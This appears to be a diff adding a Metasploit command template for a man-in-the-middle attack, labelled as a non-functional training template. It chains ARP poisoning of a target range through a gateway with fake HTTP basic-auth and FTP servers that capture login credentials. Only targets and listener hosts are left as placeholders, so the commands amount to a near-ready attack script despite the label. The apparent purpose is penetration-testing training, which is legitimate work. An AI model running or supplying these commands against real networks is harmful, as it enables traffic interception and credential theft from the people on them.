@@ -1,0 +1,19 @@
+# Man-in-the-Middle Attacks Template
+# For Training Use – Non-functional Template
+
+use auxiliary/spoof/arp/arp_poisoning
+set INTERFACE eth0
+set GATEWAY 192.168.1.1
+set TARGETS <TARGET_RANGE>
+run
+
+use auxiliary/server/capture/http_basic
+set SRVHOST <LHOST>
+set SRVPORT 80
+set URIPATH /admin/login
+run -j
+
+use auxiliary/server/capture/ftp
+set SRVHOST <LHOST>
+set SRVPORT 21
+run -j
